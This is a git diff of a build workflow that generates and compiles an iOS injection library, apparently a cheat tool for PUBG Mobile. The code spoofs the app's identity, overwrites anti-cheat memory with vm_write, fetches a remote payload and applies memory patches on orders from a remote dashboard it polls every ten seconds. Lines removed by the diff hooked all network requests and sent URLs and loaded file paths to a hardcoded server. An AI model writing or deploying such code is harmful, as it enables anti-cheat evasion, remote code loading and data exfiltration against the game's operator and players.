@@ -14,7 +14,7 @@ jobs:
 
       - name: Generate and Compile Sovereign Core
         run: |
-          # Generating Pure English Source Code for the Dormant Core
+          # Generating Pure English Source Code - Ultra Stable Edition
           cat << 'EOF' > main.mm
           #import <UIKit/UIKit.h>
           #import <mach-o/dyld.h>
@@ -32,62 +32,17 @@ jobs:
           static BOOL isPayloadInjected = NO;
           static BOOL isIdentitySpoofed = NO;
           static BOOL isAceKilled = NO;
-          
-          static NSMutableArray *blockedUrls = nil;
-          static NSMutableArray *reportedFiles = nil;
 
           @interface SovereignEliteHUD : UIView
           @property (nonatomic, strong) UILabel *statusLabel;
           @property (nonatomic, strong) UIView *lamp;
-          @property (nonatomic, strong) UITextView *netTerminal;
           @property (nonatomic, strong) UITextView *fileTerminal;
           @end
 
           @implementation SovereignEliteHUD
 
           // =========================================================
-          // [2] NETWORK SENSOR (Always active, but controlled)
-          // =========================================================
-          + (void)load {
-              static dispatch_once_t onceToken;
-              dispatch_once(&onceToken, ^{
-                  blockedUrls = [[NSMutableArray alloc] init];
-                  reportedFiles = [[NSMutableArray alloc] init];
-
-                  // Only Hook Network for Recon. Identity is NOT spoofed automatically!
-                  Method origNet = class_getInstanceMethod([NSURLSession class], @selector(dataTaskWithRequest:completionHandler:));
-                  Method swizNet = class_getInstanceMethod([self class], @selector(sov_dataTaskWithRequest:completionHandler:));
-                  method_exchangeImplementations(origNet, swizNet);
-              });
-          }
-
-          - (NSString *)sov_bundleIdentifier { return @"com.tencent.ig"; }
-          - (NSString *)sov_bundlePath { return @"/var/containers/Bundle/Application/ShadowTrackerExtra.app"; }
-
-          - (id)sov_dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
-              NSString *url = request.URL.absoluteString;
-              
-              // Prevent infinite loops by ignoring our own VPS IP
-              if (![url containsString:@"16.171.230.58"]) {
-                  [[NSNotificationCenter defaultCenter] postNotificationName:@"SovereignLog" object:url];
-                  
-                  // Report unknown link to Dashboard
-                  NSString *encodedUrl = [url stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
-                  NSString *reportUrl = [NSString stringWithFormat:@"%@?api=true&report_link=%@", SERVER_HOST, encodedUrl];
-                  NSURLRequest *repReq = [NSURLRequest requestWithURL:[NSURL URLWithString:reportUrl]];
-                  [[[NSURLSession sharedSession] dataTaskWithRequest:repReq completionHandler:nil] resume];
-
-                  // Sinkhole Logic (Block if commanded by Dashboard)
-                  for (NSString *blocked in blockedUrls) {
-                      if (blocked.length > 3 && [url containsString:blocked]) return nil; 
-                  }
-              }
-              
-              return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
-          }
-
-          // =========================================================
-          // [3] DYNAMIC KILL MATRIX (Triggered ONLY by Dashboard)
+          // [2] DYNAMIC KILL MATRIX (Triggered ONLY by Dashboard)
           // =========================================================
           - (void)executeIdentitySpoof {
               if (isIdentitySpoofed) return;
@@ -103,6 +58,9 @@ jobs:
               method_exchangeImplementations(origPath, swizPath);
               NSLog(@"[Sovereign] Commanded: Identity Mask Enabled.");
           }
+
+          - (NSString *)sov_bundleIdentifier { return @"com.tencent.ig"; }
+          - (NSString *)sov_bundlePath { return @"/var/containers/Bundle/Application/ShadowTrackerExtra.app"; }
 
           - (void)executeAceKill {
               if (isAceKilled) return;
@@ -124,13 +82,13 @@ jobs:
                       vm_write(task, (vm_address_t)target, (vm_offset_t)&ret_cmd, 4);
                       vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
                       isAceKilled = YES;
-                      NSLog(@"[Sovereign] Commanded: ACE Schedule 3 Neutalized.");
+                      NSLog(@"[Sovereign] Commanded: ACE Schedule 3 Neutralized.");
                   }
               }
           }
 
           // =========================================================
-          // [4] VOLATILE PAYLOAD (Triggered ONLY by Dashboard)
+          // [3] VOLATILE PAYLOAD (Triggered ONLY by Dashboard)
           // =========================================================
           - (void)igniteVolatilePulse {
               [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:PAYLOAD_URL] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
@@ -157,7 +115,7 @@ jobs:
           }
 
           // =========================================================
-          // [5] DYNAMIC MEMORY PATCHER (Triggered ONLY by Dashboard)
+          // [4] DYNAMIC MEMORY PATCHER (Triggered ONLY by Dashboard)
           // =========================================================
           - (void)executePatches:(NSArray *)payloads {
               uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
@@ -194,7 +152,7 @@ jobs:
           }
 
           // =========================================================
-          // [6] TACTICAL UI ENGINE
+          // [5] TACTICAL UI ENGINE
           // =========================================================
           - (instancetype)initWithFrame:(CGRect)frame {
               self = [super initWithFrame:frame];
@@ -205,7 +163,7 @@ jobs:
                   self.layer.borderWidth = 1.5;
 
                   UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, 5, frame.size.width, 15)];
-                  title.text = @"SOVEREIGN ELITE PRO v70";
+                  title.text = @"SOVEREIGN ELITE v115k";
                   title.textColor = [UIColor cyanColor];
                   title.font = [UIFont boldSystemFontOfSize:9];
                   title.textAlignment = NSTextAlignmentCenter;
@@ -222,59 +180,17 @@ jobs:
                   self.lamp.layer.cornerRadius = 6;
                   [self addSubview:self.lamp];
 
-                  self.netTerminal = [[UITextView alloc] initWithFrame:CGRectMake(10, 50, frame.size.width - 20, 55)];
-                  self.netTerminal.backgroundColor = [UIColor blackColor];
-                  self.netTerminal.textColor = [UIColor greenColor];
-                  self.netTerminal.font = [UIFont fontWithName:@"Courier" size:7];
-                  self.netTerminal.editable = NO;
-                  [self addSubview:self.netTerminal];
-
-                  self.fileTerminal = [[UITextView alloc] initWithFrame:CGRectMake(10, 110, frame.size.width - 20, 55)];
+                  self.fileTerminal = [[UITextView alloc] initWithFrame:CGRectMake(10, 50, frame.size.width - 20, 60)];
                   self.fileTerminal.backgroundColor = [UIColor blackColor];
                   self.fileTerminal.textColor = [UIColor yellowColor];
                   self.fileTerminal.font = [UIFont fontWithName:@"Courier" size:7];
                   self.fileTerminal.editable = NO;
                   [self addSubview:self.fileTerminal];
 
-                  [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(onNetEvent:) name:@"SovereignLog" object:nil];
-                  
                   [self startSyncLoop];
-                  [self scanFiles];
                   [self enableDrag];
               }
               return self;
-          }
-
-          - (void)onNetEvent:(NSNotification *)n {
-              dispatch_async(dispatch_get_main_queue(), ^{
-                  self.netTerminal.text = [NSString stringWithFormat:@"%@\n> %@", self.netTerminal.text, n.object];
-                  [self.netTerminal scrollRangeToVisible:NSMakeRange(self.netTerminal.text.length - 1, 1)];
-              });
-          }
-
-          - (void)scanFiles {
-              uint32_t count = _dyld_image_count();
-              for (uint32_t i = 0; i < count; i++) {
-                  const char *name = _dyld_get_image_name(i);
-                  if (name) {
-                      NSString *fullPath = [NSString stringWithUTF8String:name];
-                      NSString *fileName = [fullPath lastPathComponent];
-                      
-                      // Report only once per file to avoid flooding VPS
-                      if (![reportedFiles containsObject:fileName]) {
-                          [reportedFiles addObject:fileName];
-                          
-                          if ([fileName containsString:@"Shadow"] || [fileName containsString:@"anogs"]) {
-                              self.fileTerminal.text = [NSString stringWithFormat:@"%@\n* %@", self.fileTerminal.text, fileName];
-                          }
-                          
-                          NSString *encPath = [fullPath stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
-                          NSString *reportUrl = [NSString stringWithFormat:@"%@?api=true&report_file=%@&path=%@", SERVER_HOST, fileName, encPath];
-                          NSURLRequest *repReq = [NSURLRequest requestWithURL:[NSURL URLWithString:reportUrl]];
-                          [[[NSURLSession sharedSession] dataTaskWithRequest:repReq completionHandler:nil] resume];
-                      }
-                  }
-              }
           }
 
           - (void)startSyncLoop {
@@ -297,11 +213,7 @@ jobs:
                       // 3. Volatile Payload Trigger
                       if ([json[@"payload_status"] intValue] == 1 && !isPayloadInjected) { [self igniteVolatilePulse]; }
 
-                      // 4. Update Blacklist
-                      [blockedUrls removeAllObjects];
-                      if (json[@"blocked_urls"]) { [blockedUrls addObjectsFromArray:json[@"blocked_urls"]]; }
-
-                      // 5. Apply Patches
+                      // 4. Apply Patches
                       if (json[@"payload"]) { [self executePatches:json[@"payload"]]; }
 
                       self.statusLabel.text = json[@"notification"];
@@ -314,6 +226,7 @@ jobs:
                       }
                   });
               }] resume];
+              
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
           }
 
@@ -357,7 +270,7 @@ jobs:
                   }
                   if (!win) win = [UIApplication sharedApplication].keyWindow;
                   if (win) {
-                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake(40, 50, 220, 180)];
+                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake(40, 50, 220, 120)];
                       [win addSubview:ui];
                   }
               });
@@ -373,5 +286,5 @@ jobs:
       - name: Upload Sovereign Dylib
         uses: actions/upload-artifact@v4
         with:
-          name: Sovereign-Pro-v110k-Dormant
+          name: Sovereign-Pro-v115k-Stable
           path: Sovereign_Elite.dylib
